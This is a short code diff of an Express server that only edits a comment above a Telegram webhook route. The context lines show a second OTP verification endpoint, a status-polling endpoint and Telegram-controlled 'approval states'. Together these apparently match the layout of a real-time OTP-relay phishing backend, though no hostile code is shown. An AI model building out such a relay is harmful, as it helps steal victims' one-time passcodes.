@@ -108,8 +108,7 @@ app.post('/api/verify-otp2', async (req, res) => {
 app.get('/api/check-otp2-status', (req, res) => {
     res.json({ status: otp2Status });
 });
-
-//4. Telegram Webhook (Prevents button spinner hanging & controls approval states)
+ //Telegram Webhook (Prevents button spinner hanging & controls approval states)
 app.post('/webhook', async (req, res) => {
     // Immediately send HTTP 200 so Telegram doesn't time out
     res.sendStatus(200);
